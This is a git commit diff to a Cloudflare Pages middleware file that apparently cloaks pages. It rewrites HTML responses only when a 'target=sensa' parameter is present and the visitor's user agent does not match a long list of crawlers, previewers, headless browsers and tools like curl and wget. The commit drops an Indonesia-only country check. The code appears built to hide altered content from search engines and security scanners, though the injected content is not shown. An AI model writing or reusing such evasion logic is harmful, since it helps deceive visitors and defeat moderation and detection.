b74958b42d2c9bc5ffbe1f7b6d1ac3ceac1c9bec
belajarasik1122-pixel <belajarasik1122@gmail.com>
2025-12-30 14:20:00 +0700

    Update test _middleware.js

--- functions/_middleware.js
+++ functions/_middleware.js
@@ -2,13 +2,9 @@ export async function onRequest(context) {
   const { request, next } = context;
   const url = new URL(request.url);
   const userAgent = (request.headers.get('user-agent') || '').toLowerCase();
-  const country = request.cf ? request.cf.country : 'Unknown';
   const asOrganization = request.cf ? request.cf.asOrganization : '';
   const targetKey = url.searchParams.get('target');
   if (targetKey !== 'sensa') {
-    return next();
-  }
-  if (country !== 'ID') {
     return next();
   }
   const botList = /bot|spider|crawl|facebook|google|bing|slurp|yandex|adsbot|tiktok|bytedance|lighthouse|vision|petalinux|headless|linux|python|wget|curl|screenshot|preview|mediapartners|dubbin|monit/i;
@@ -31,4 +27,5 @@ export async function onRequest(context) {
     .transform(response);
 
 }
+
 
